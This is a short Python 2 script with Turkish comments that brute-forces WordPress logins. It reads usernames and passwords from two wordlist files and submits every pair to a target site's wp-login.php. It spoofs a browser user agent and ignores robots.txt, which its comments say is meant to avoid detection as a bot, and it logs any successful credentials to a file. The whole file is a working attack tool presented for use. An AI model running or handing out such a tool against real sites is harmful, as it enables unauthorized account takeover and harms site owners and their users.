
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
 
import mechanize #kütüphanemizi import ettik
 
class Tarayici(object): # sınıfınız
	def __init__(self): # __init__ 
		self.br = mechanize.Browser() # mechanize kütüphanesi içerisindeki Browser sınıfını örnekledik
		self.br.set_handle_robots(False) # bot olduğumuzu kolay yoldan anlamamaları için 
		self.br.addheaders = [("User-agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"),
		("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
		("Content-type","application/x-www-form-urlencoded; charset=UTF-8")] # tarayıcımıza header ekledik
		self.red = "\033[31m" # kırmızı
		self.white = "\033[97m" # beyaz
		self.reset = "\033[0m" # resetleme
		self.bold = "\033[1m" # koyu yazma
		self.underline = "\033[4m" # altyazılı yazma
		## dosya işlemleri
		self.dosya = open("user.txt","r") #user.txt okumak için açtık
		self.userid = [] #boş dizi
		self.userid = self.dosya.read().split("\n") #parçaladık ve atadık dizimize değerleri
		self.userid.remove("") # son satırda oluşan boş değerini diziden temizledik
		self.dosya.close() # dosyamızı kapattık
		######################
		self.passid = []
		self.dosya = open("pass.txt","r")
		self.passid = self.dosya.read().split("\n")
		self.passid.remove("")
		self.dosya.close()
	def attackWordpress (self,link,log,pwd): #fonksiyonumuz
		self.site = "http://www."+link+"/wp-login.php" # linki düzenledik
		self.br.open(self.site) # linki açtık
		self.first_title = self.br.title() # gidilen linkin başlığını aldık
		self.br.select_form(nr=0) # ilk formu seçtik
		self.br["log"] = log #username
		self.br["pwd"] = pwd #password
		self.br.submit() # gönderdik
		if self.first_title == self.br.title():# post sonrası açılan sayfanın başlığı ile ilk başlığı karşılaştırdık
			print self.bold+self.red+"[!] FALSE >> "+log+" : "+pwd+" ---> "+link+self.reset
			return 0
		else:
			print self.bold+self.white+"[+] TRUE >> "+log+" : "+pwd+" --->"+link+self.reset
			return 1
	def run(self,link,output): # fonksiyon
		self.dosya = open(output,"a+") #output dosyasını açıyoruz
		try:
			for username in self.userid: # user.txt deki kullanıcı adları
				for userpass in self.passid: # pass.txt deki parolalar
					x = self.attackWordpress(link,username,userpass)
					if x == 1:
						self.dosya.write("[+] "+link+" >> "+username+" : "+userpass)
		except Exception,e:
			print e
			print self.underline+"[?] Pass > "+self.site+self.reset
		self.dosya.close() # output dosyasını kapa
